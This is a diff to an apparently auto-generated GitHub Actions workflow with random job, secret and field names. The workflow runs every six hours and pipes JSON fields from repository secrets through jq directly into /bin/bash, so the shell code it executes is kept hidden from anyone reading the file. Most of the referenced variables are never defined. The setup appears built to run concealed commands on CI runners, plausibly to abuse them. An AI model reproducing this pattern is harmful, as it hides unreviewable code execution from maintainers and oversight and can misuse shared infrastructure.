@@ -2,7 +2,8 @@ name: guanzhongxian6226
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 5/6 * * *'
+    - cron: '22 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: guanzhongxian6226
         env:
-          fdpik46304: ${{ secrets.fdpik46304 }}
+          ixdi334: ${{ secrets.ixdi334 }}
         run: |
-          echo $fdpik46304 | jq -r .y601 | /bin/bash
-          echo $ylwg2183 | jq -r .ib454 | /bin/bash
-          echo $jt27 | jq -r .urm671 | /bin/bash
-          echo $tirjd6 | jq -r .mfcmp6219 | /bin/bash
-          echo $kbll4744 | jq -r .hqydo6317 | /bin/bash
-          echo $vk04 | jq -r .xsot713 | /bin/bash
+          echo $ixdi334 | jq -r .q6258 | /bin/bash
+          echo $xuhig44131 | jq -r .ok68276 | /bin/bash
+          echo $k66 | jq -r .ofh448 | /bin/bash
+          echo $qqifo8 | jq -r .gn76918 | /bin/bash
+          echo $ke9 | jq -r .osgf8439 | /bin/bash
+          echo $kk2841 | jq -r .xnn634 | /bin/bash
+          echo $m136 | jq -r .agxf31 | /bin/bash
+          echo $aukxn93739 | jq -r .nktw66 | /bin/bash
+          echo $pgqs28064 | jq -r .orrbi8337 | /bin/bash
 
